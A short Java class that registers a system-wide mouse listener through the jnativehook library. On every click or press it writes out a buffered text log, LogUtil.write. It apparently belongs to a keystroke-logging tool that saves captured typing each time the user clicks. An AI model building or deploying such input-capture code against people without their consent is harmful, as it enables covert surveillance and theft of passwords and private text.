package com.app;

import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;

public class InterceptMouse implements NativeMouseListener {
	
	@Override
	public void nativeMouseClicked(NativeMouseEvent event) {
		if (LogUtil.write.length() > 0) {
			LogUtil.writingText(LogUtil.write.toString());
			LogUtil.write.setLength(0);
		}
	}

	@Override
	public void nativeMousePressed(NativeMouseEvent event) {
		if (LogUtil.write.length() > 0) {
			LogUtil.writingText(LogUtil.write.toString());
			LogUtil.write.setLength(0);
		}
	}

	@Override
	public void nativeMouseReleased(NativeMouseEvent event) {}
}